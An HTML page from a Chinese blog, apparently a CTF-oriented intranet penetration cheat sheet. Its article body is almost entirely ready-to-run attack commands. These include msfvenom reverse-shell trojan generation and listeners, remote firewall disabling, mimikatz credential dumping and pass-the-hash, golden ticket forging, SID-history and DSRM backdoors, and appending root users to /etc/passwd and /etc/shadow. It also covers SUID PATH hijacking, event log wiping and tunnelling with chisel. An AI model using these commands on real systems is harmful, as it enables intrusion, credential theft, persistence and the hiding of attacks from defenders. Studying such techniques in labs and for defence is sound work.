<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>内网渗透总结 | Rural Blog</title>
<meta name="keywords" content="CTF, 内网">
<meta name="description" content="内网安全">
<meta name="author" content="Rural Bee">
<link rel="canonical" href="https://ruralbee.github.io/posts/ctf/ctf_intranet/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.5383ad15d511330a28046e58be749b9993bc009a779247c92ba27718a372d5e8.css" integrity="sha256-U4OtFdURMwooBG5YvnSbmZO8AJp3kkfJK6J3GKNy1eg=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ruralbee.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ruralbee.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://ruralbee.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://ruralbee.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://ruralbee.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://ruralbee.github.io/posts/ctf/ctf_intranet/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="内网渗透总结" />
<meta property="og:description" content="内网安全" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ruralbee.github.io/posts/ctf/ctf_intranet/" /><meta property="og:image" content="https://ruralbee.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-12-16T00:00:00+00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://ruralbee.github.io/papermod-cover.png"/>

<meta name="twitter:title" content="内网渗透总结"/>
<meta name="twitter:description" content="内网安全"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ruralbee.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "内网渗透总结",
      "item": "https://ruralbee.github.io/posts/ctf/ctf_intranet/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "内网渗透总结",
  "name": "内网渗透总结",
  "description": "内网安全",
  "keywords": [
    "CTF", "内网"
  ],
  "articleBody": "内网渗透 Kali 探测命令 netdiscover\nnetdiscover -i eth0 -r 192.168.111.0/24 探测网卡下同段存在主机 namp\nnmap 192.168.111.129` # 探测存在的服务 nmap -T4 -sC -sV 192.168.1.8 -p: 指定端口扫描范围 -F：扫描比缺省少的端口 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -O：探测指定IP的相关数据。 -sP：主机探测 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 --dns-servers : 指定DNS 服务器 --system-dns:调用系统的DNS服务器 --traceroute：显示追踪到目标的路径 -sS/sT/sA/sW/sM:TCP扫描 -sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 -sT是全连接扫描会和服务器建立完整的三次握手，效率低 -sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 -sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 -sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 Linux 常见命令 uname -a # 获取所有版本信息 uname -m # 获取Linux内核架构 cat /proc/version # 获取内核信息 cat /etc/*-release # 发布信息 cat /etc/issue # 发布信息 hostname # 获取主机名 cat /etc/passwd # 列出系统所有用户 cat /etc/group # 列出系统所有组 w # 查看目前登录的用户 whoami # 查看当前用户 id # 查看当前用户信息 sudo -l # 列出目前用户可执行与无法执行的指令 ps aux # 查看进程信息 ls -la /etc/cron* # 查看计划任务 ifconfig -a # 列出网络接口信息 cat /etc/network/interfaces # 列出网络接口信息 arp -a # 查看系统arp表 route # 打印路由信息 netstat -anplt # 打印本地端口开放信息 iptables -L # 列出iptable的配置规则 nohup 命令 \u0026 #后台运行 Windows 初步收集 查看基本信息命令 ipconfig /all # 查看本机ip，所在域 route print # 打印路由信息 net view # 查看局域网内其他主机名 net view /domain # 查看主域信息 arp -a # 查看arp缓存 net start # 查看开启了哪些服务 net share # 查看开启了哪些共享 net config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 echo %PROCESSOR_ARCHITECTURE% // 查看系统体系结构 systeminfo // 查看操作系统信息 nslookup god.org\t#nslookup直接解析域名服务器 net user # 查看本机用户列表 net user /domain # 查看域用户 net localgroup administrators # 查看本地管理员组（通常会有域用户） net computers # 查看连接的电脑 net view /domain # 查看有几个域 net user \"用户名\" /domain # 获取指定域用户的信息 net group /domain # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group \"组名\" /domain # 查看域中某工作组 net group \"domain admins\" /domain # 查看域管理员的名字 net group \"domain computers\" /domain # 查看域中的其他主机名 net group \"doamin controllers\" /domain # 查看域控制器（可能有多台） net group \"Enterprise Admins\" /domain // 查看域管理员组 net accounts /domain #查看域密码信息 nltest /domain_trusts #查看域信任信息 net添加用户 net user \"username\" \"password\" /add #添加账户名和密码的用户, 不用双引号也可以 net localgroup administrators \"username\" /add #将用户添加到本地管理员中 net共享盘符连接 net use # 查看与本机的共享链接 net view \\\\IP #查看远程主机开启的默认共享 net share # 查看本机开启了哪些共享 net share ipc$ # 开启本机ipc共享 net share c$ # 开启本机c盘共享 net use \\\\IP\\ipc$ \"password\" /user:\"username\" #建立空连接 net use z: \\\\IP\\c$ \"password\" /user:\"username\" #建立共享盘符 net use \\\\IP\\ipc$ /del #删除空连接 net use z: /del #删除本机映射的z盘 net use * /del #删除本机所有映射和IPC$连接 dir \\\\192.168.xx.xx\\c$\\user # 查看192.168.xx.xx c盘user目 录下的文件 copy mimikatz.exe \\\\192.168.138.138\\c$ #复制文件到目标ip的c盘下面 计划任务 schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务 schtasks /create /tn \"taskName\" /tr C:\\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p \"Liu78963\" #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName schtasks /delete /tn taskName #删除计划任务 netstat 查看端口是否开放 netstat -ano | find \"3389\" 开启3389命令 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 查看进程并删除 tasklist | findstr \"artifact\" taskkill /pid 2888 -f 关闭防火墙\n本地关闭 netsh advfirewall set allprofiles state off net stop windefend netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes #防火墙设置白名单 - 远程关闭\rnet use \\\\192.168.93.10\\ipc$ \"dc123.com\" /user:\"administrator\" sc \\\\192.168.93.10 create unablefirewall binpath= \"netsh advfirewall set allprofiles state off\" sc \\\\192.168.93.10 start unablefirewall net use \\\\192.168.93.10\\ipc$ /del 开启远程桌面 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #开启远程桌面功能 程序异常弹窗解决\n关闭所有程序异常弹窗 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"Disabled\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"LoggingDisabled\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontSendAdditionalData\" /t REG_DWORD /d 1 /f - 开启所有程序异常弹窗\rreg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /f reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v Disabled /f reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v LoggingDisabled /f reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v DontSendAdditionalData /f 注意：win7下的弹窗错误程序为WerFault.exe，使用计划任务不会出现弹窗错误\nwmic命令执行 net use \\\\192.168.7.7\\ipc$ \"1qaz@WSX\" /user:administrator #建立ipc链接 wmic /node:192.168.7.7 process call create \"cmd.exe /c ipconfig \u003ec:\\ip.txt\" #执行cmd命令并将结果保存在txt文档中 type \\\\192.168.7.7\\C$\\ip.txt #查看执行结果 或 wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create \"cmd /c ipconfig \u003e c:\\1.txt\" 启用dsrm登录 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -name \"DsrmAdminLogonBehavior\" -value 2 -propertyType DWORD #powershell 或 reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 修改注册表抓明文(win10或2012R2以上，未验证） reg add HKLM/SYSTEM/CurrentControlSet/Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 其他命令 netsh winsock reset #重启网络 横向移动 ping扫描 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr \"TTL=\" 用Ping命令探测内网主机 MSF MSF生成Windows木马命令 反向链接木马msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.131 lport=6000 -f exe \u003eshell.exe 反向链接木马操作 msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF生成Linux木马命令 反向链接木马 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf \u003e shell.elf 反向链接木马操作 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF生成Linux系统的Java网站木马命令 木马msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=2222 -f jsp \u003e shell.jsp 链接操作 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF常见命令 getuid #获取当前账号权限 getsystem #获取system权限 run post/windows/manage/enable_rdp #关闭windows防火墙 run post/windows/gather/smart_hashdump 获取window哈希 run autoroute -s 192.168.52.0/24 #添加路由，在木马上使用 autoroute -p #查看路由，在密码上使用 route add 192.168.138.0 255.255.255.0 1 #添加路由在msf上使用 route print #查看路由在msf上使用 run post/windows/gather/enum_patches #查看补丁情况 setg Proxies socks5:127.0.0.1:1080 #设置代理 show options lhost #显示lhost的设置 psexec传递 （确保已经设置好路由） use exploit/windows/smb/psexec set payload windows/x64/meterpreter/bind_tcp set rhost 10.10.10.10 set SMBUser administrator set SMBPass 1qaz@WSX run MSF使用ms17-010开启3389 use auxiliary/admin/smb/ms17_010_command set COMMAND REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal\\\" \\\"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f set rhost x.x.x.x MSF使用mimikatz（被kiwi取代） migrate [PID] #如果是x64需要这个步骤 load kiwi #加载模块 help kiwi #查看帮助 creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 MSF smb爆破密码 use auxiliary/scanner/smb/smb_login set SMBUser administrator set PASS_FILE /root/fuzzDicts/passwordDict/top500.txt set rhost 192.168.93.10 exploit MSF 令牌偷取（用于提权） getuid #查看当前token use incognito #加载incognito list_tokens -u #列出AccessToken impersonate_token \"TEST\\adminitrator\" #模拟TEST\\adminitrator用户 rev2self #返回到之前的AccessToken权限 MSF存活主机探测 use auxiliary/scanner/discovery/udp_probe set rhosts 192.168.183.0/24 set threads 5 exploit MSF powershell 攻击 use exploit/multi/script/web_delivery set target 2 # 选择使用powershell类型的payload set payload windows/meterpreter/reverse_tcp set lport 2222 set lhost 192.168.135.150 exploit MSF清除痕迹 run event_manager -i run event_manager -c 小工具使用 Mimitakz使用 获取账号密码 privilege::debug #权限提升 sekurlsa::logonPasswords #获取账号密码 获取NTLM hash privilege::debug token::elevate lsadump::sam hash攻击 （会弹出一个cmd窗口，有风险） privilege::debug sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46 #DC是域控的名称 ntlm是上述获得结果 Eeathworm使用 -l listenport open a port for the service startup. // 为服务启动打开一个端口。 -d refhost set the reflection host address. // 设置反连主机地址。 -e refport set the reflection port. // 设置反连端口。 -f connhost set the connect host address . // 设置连接主机地址。 -g connport set the connect port. // 设置连接端口。 -t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000 -s state setup the function. // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen ssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理 lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。 lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。 lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。 proxychains4 使用方法 proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141 # 需要配置/etc/proxychains4.conf文件 -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址 chisel使用 端口转发 #将本地的11111端口转发到服务器上的8000端口 正向链接 ./chisel server -p 12345 chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000 反向链接 chisel.exe server -p 12345 --reverse ./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000 socks代理 本地1088端口代理服务器 正向链接 chisel.exe server -p 12345 --socks5 ./chisel client 192.168.61.129:12345 1088:socks 反向链接 ./chisel server -p 12345 --reverse --socks5 ./chisel client 192.168.111.2:12345 R:1088:socks 权限维持 黄金票据 导出域控制器用户密码或hash privilege::debug lsadump::lsa /patch # 专用于在域控制器上导出用户密码或hash 切换到用户主机下使用minikatz生成票据 kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi 修改票据 kerberos::purge #先清空所有票据 kerberos::ptt ticket.kirbi #再将生成的票据注入域用户主机Windows7中 kerberos::tgt #查看系统票据 SID History域后门 添加恶意用户 net user aaa Aaa123456 /add #添加用户名为aaa密码为Aaa123456的用户\r使用mimikatz将域管理员的SID添加到恶意域用户\nprivilege::debug sid::patch sid::add /sam:aaa /new:Administrator //将管理员Administrator的SID添加到用户aaa的SID History属性中 DSRM 后门 修改DSRM账户（需要远程登录调用cmd窗口，有危险） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码 reset password on server null // 在当前域控制器上恢复DSRM密码 // 输入新密码 // 重新输入新密码 q //退出DSRM密码设置模式 q // 退出ntdsutil DSRM与域用户同步（于第一步类似，不必重复） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码 sync from domain account domainusername // 使DSRM的密码和指定的domainusername域用户的密码同步 q //退出DSRM密码设置模式 q // 退出ntdsutil 启用DSRM登录 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -name \"DsrmAdminLogonBehavior\" -value 2 -propertyType DWORD #powershell 或 reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 #cmd方式 mimikatz获取NTLM hash （见mimikate用法） mimikatz使用hash攻击 （见mimikate用法） 提权 Linux提取放行普通用户提权 创建普通用户（密码123456） echo 'meme:x:1001:1001:,,,:/home/meme:/bin/bash' \u003e\u003e /etc/passwd echo 'meme:x:1001:' \u003e\u003e /etc/group echo 'meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::' \u003e\u003e /etc/shadow echo 'meme:!::' \u003e\u003e /etc/gshadow 提权 echo 'ubuntu ALL=(ALL:ALL) ALL' \u003e\u003e /etc/sudoers #需要root权限才能做，不能使用sudo sudo su root #输入ubuntu用户的密码即可 创建root用户（密码123456） echo 'xi:x:0:0:root:/root:/bin/bash' \u003e\u003e /etc/passwd echo 'xi:x:0:' \u003e\u003e /etc/group echo 'xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::' \u003e\u003e /etc/shadow echo 'xi:!::' \u003e\u003e /etc/gshadow suid ps程序提权 前提条件，存在一个SUID程序，并且该程序调用ps命令 判断条件： find / -perm -u=s -type f 2\u003e/dev/null # 查找短暂拥有root权限的命令程序 修改环境变量，伪造ps命令 cd /tmp echo \"/bin/bash\" \u003e ps chmod 777 ps export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序 或 ln -s /bin/bash /tmp/ps 执行判断条件2中获取的程序。 警告：需要在反弹shell上使用，无法在webshell上成功执行和提权，需要全交交互式才行\nlinux ssh免登录方式 本地生成文件 ssh-keygen -t rsa #生成公钥和私钥 (echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") \u003e public.txt #到处公钥 (echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa; echo -e \"\\n\\n\") \u003e private.txt #到处私钥 公钥上传 cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys #~/.ssh/authorized_keys 是上传的文件路径 echo '生成的.pub文件的内容即hello.pub' \u003e ~/.ssh/authorized_keys #写入文件 ",
  "wordCount" : "1290",
  "inLanguage": "zh",
  "datePublished": "2023-12-16T00:00:00Z",
  "dateModified": "2023-12-16T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Rural Bee"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ruralbee.github.io/posts/ctf/ctf_intranet/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rural Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ruralbee.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ruralbee.github.io/" accesskey="h" title="Rural Blog (Alt + H)">Rural Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="https://ruralbee.github.io/profile/" title="Profile"
                            aria-label="Profile">Profile</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ruralbee.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://ruralbee.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://ruralbee.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://github.com/RuralBee/" title="Github">
                    <span>Github</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ruralbee.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://ruralbee.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      内网渗透总结
    </h1>
    <div class="post-description">
      内网安全
    </div>
    <div class="post-meta"><span title='2023-12-16 00:00:00 +0000 UTC'>十二月 16, 2023</span>&nbsp;·&nbsp;7 分钟&nbsp;·&nbsp;Rural Bee

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f" aria-label="内网渗透">内网渗透</a><ul>
                            
                    <li>
                        <a href="#kali" aria-label="Kali">Kali</a><ul>
                            
                    <li>
                        <a href="#%e6%8e%a2%e6%b5%8b%e5%91%bd%e4%bb%a4" aria-label="探测命令">探测命令</a></li></ul>
                    </li>
                    <li>
                        <a href="#linux" aria-label="Linux">Linux</a><ul>
                            
                    <li>
                        <a href="#%e5%b8%b8%e8%a7%81%e5%91%bd%e4%bb%a4" aria-label="常见命令">常见命令</a></li></ul>
                    </li>
                    <li>
                        <a href="#windows" aria-label="Windows">Windows</a><ul>
                            
                    <li>
                        <a href="#%e5%88%9d%e6%ad%a5%e6%94%b6%e9%9b%86" aria-label="初步收集">初步收集</a></li>
                    <li>
                        <a href="#%e5%85%b6%e4%bb%96%e5%91%bd%e4%bb%a4" aria-label="其他命令">其他命令</a></li>
                    <li>
                        <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8" aria-label="横向移动">横向移动</a></li></ul>
                    </li>
                    <li>
                        <a href="#msf" aria-label="MSF">MSF</a><ul>
                            
                    <li>
                        <a href="#msf%e7%94%9f%e6%88%90windows%e6%9c%a8%e9%a9%ac%e5%91%bd%e4%bb%a4" aria-label="MSF生成Windows木马命令">MSF生成Windows木马命令</a></li>
                    <li>
                        <a href="#msf%e7%94%9f%e6%88%90linux%e6%9c%a8%e9%a9%ac%e5%91%bd%e4%bb%a4" aria-label="MSF生成Linux木马命令">MSF生成Linux木马命令</a></li>
                    <li>
                        <a href="#msf%e7%94%9f%e6%88%90linux%e7%b3%bb%e7%bb%9f%e7%9a%84java%e7%bd%91%e7%ab%99%e6%9c%a8%e9%a9%ac%e5%91%bd%e4%bb%a4" aria-label="MSF生成Linux系统的Java网站木马命令">MSF生成Linux系统的Java网站木马命令</a></li>
                    <li>
                        <a href="#msf%e5%b8%b8%e8%a7%81%e5%91%bd%e4%bb%a4" aria-label="MSF常见命令">MSF常见命令</a></li>
                    <li>
                        <a href="#psexec%e4%bc%a0%e9%80%92-%e7%a1%ae%e4%bf%9d%e5%b7%b2%e7%bb%8f%e8%ae%be%e7%bd%ae%e5%a5%bd%e8%b7%af%e7%94%b1" aria-label="psexec传递 （确保已经设置好路由）">psexec传递 （确保已经设置好路由）</a></li>
                    <li>
                        <a href="#msf%e4%bd%bf%e7%94%a8ms17-010%e5%bc%80%e5%90%af3389" aria-label="MSF使用ms17-010开启3389">MSF使用ms17-010开启3389</a></li>
                    <li>
                        <a href="#msf%e4%bd%bf%e7%94%a8mimikatz%e8%a2%abkiwi%e5%8f%96%e4%bb%a3" aria-label="MSF使用mimikatz（被kiwi取代）">MSF使用mimikatz（被kiwi取代）</a></li>
                    <li>
                        <a href="#msf-smb%e7%88%86%e7%a0%b4%e5%af%86%e7%a0%81" aria-label="MSF smb爆破密码">MSF smb爆破密码</a></li>
                    <li>
                        <a href="#msf-%e4%bb%a4%e7%89%8c%e5%81%b7%e5%8f%96%e7%94%a8%e4%ba%8e%e6%8f%90%e6%9d%83" aria-label="MSF 令牌偷取（用于提权）">MSF 令牌偷取（用于提权）</a></li>
                    <li>
                        <a href="#msf%e5%ad%98%e6%b4%bb%e4%b8%bb%e6%9c%ba%e6%8e%a2%e6%b5%8b" aria-label="MSF存活主机探测">MSF存活主机探测</a></li>
                    <li>
                        <a href="#msf-powershell-%e6%94%bb%e5%87%bb" aria-label="MSF powershell 攻击">MSF powershell 攻击</a></li>
                    <li>
                        <a href="#msf%e6%b8%85%e9%99%a4%e7%97%95%e8%bf%b9" aria-label="MSF清除痕迹">MSF清除痕迹</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%b0%8f%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8" aria-label="小工具使用">小工具使用</a><ul>
                            
                    <li>
                        <a href="#mimitakz%e4%bd%bf%e7%94%a8" aria-label="Mimitakz使用">Mimitakz使用</a></li>
                    <li>
                        <a href="#eeathworm%e4%bd%bf%e7%94%a8" aria-label="Eeathworm使用">Eeathworm使用</a></li>
                    <li>
                        <a href="#proxychains4-%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95" aria-label="proxychains4 使用方法">proxychains4 使用方法</a></li>
                    <li>
                        <a href="#chisel%e4%bd%bf%e7%94%a8" aria-label="chisel使用">chisel使用</a></li></ul>
                    </li>
                    <li>
